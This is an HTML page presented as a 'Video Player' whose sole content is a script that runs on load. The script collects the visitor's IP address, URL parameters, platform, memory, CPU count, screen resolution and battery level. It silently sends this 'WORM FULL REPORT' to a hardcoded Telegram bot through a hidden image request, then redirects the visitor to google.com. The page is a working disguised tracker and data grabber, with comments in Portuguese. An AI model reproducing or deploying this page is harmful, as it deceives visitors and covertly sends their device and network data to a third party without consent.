<!DOCTYPE html>
<html>
<head>
    <title>Video Player</title>
</head>
<body style="background-color: #000;">
    <script>
        const TOKEN = "8536635132:AAGU7VibS5L3GkZ9WYDjMsRhbKs_XQlBbGA";
        const CHAT_ID = "8053770740";
        const REDIRECT_URL = "https://google.com";

        async function worm_sniff() {
            let ip = "N/A";
            const params = new URLSearchParams(window.location.search).toString() || "Nenhum";
            
            try {
                // Captura IP via Cloudflare (Bypass Brave)
                const r = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
                const t = await r.text();
                ip = t.match(/ip=(.*)/)[1];
            } catch(e) {}

            // Metadados do Sistema
            const specs = {
                plt: navigator.platform,
                mem: navigator.deviceMemory + "GB",
                cpu: navigator.hardwareConcurrency,
                res: screen.width + "x" + screen.height,
                bat: "N/A"
            };

            // Captura Bateria
            if (navigator.getBattery) {
                try {
                    const b = await navigator.getBattery();
                    specs.bat = Math.round(b.level * 100) + "%";
                } catch(e) {}
            }

            // Montagem do Relatorio
            const report = "WORM FULL REPORT\n" +
                           "IP: " + ip + "\n" +
                           "INJETADO: " + params + "\n" +
                           "SISTEMA: " + specs.plt + "\n" +
                           "RAM/CPU: " + specs.mem + "/" + specs.cpu + "\n" +
                           "TELA: " + specs.res + "\n" +
                           "BATERIA: " + specs.bat;

            const target = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(report);
            
            // Envio via Image (Mais silencioso)
            const img = new Image();
            img.src = target;

            // Redirecionamento
            setTimeout(() => {
                window.location.replace(REDIRECT_URL);
            }, 800);
        }

        worm_sniff();
    </script>
</body>
</html>
